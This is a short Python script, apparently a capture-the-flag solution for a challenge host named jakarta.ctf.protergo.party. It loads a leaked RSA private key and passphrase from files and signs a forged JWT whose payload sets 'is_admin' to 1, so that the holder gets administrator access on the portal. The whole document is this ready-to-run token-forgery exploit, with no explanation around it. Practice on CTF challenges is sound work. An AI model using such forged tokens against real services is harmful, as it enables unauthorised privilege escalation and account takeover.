import jwt
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
with open('private.pem', 'rb') as f:
    private_key_pem = f.read()

with open('passphrase', 'rb') as f:
    passphrase = f.read().strip()

private_key = serialization.load_pem_private_key(
    private_key_pem,
    password=passphrase,
    backend=default_backend()
)

payload = {
    "iss":"http://jakarta.ctf.protergo.party:10003/api/portal_login",
    "iat":1707426564,
    "exp":1707430164,
    "nbf":1707426564,
    "jti":"TiPPm7pgqoKWerqa",
    "sub":"35",
    "prv":"3da04507aadf132cee732fdee4ef6aa390dec579",
    "is_admin":1
}
token = jwt.encode(payload, private_key, algorithm='RS256')
print(token)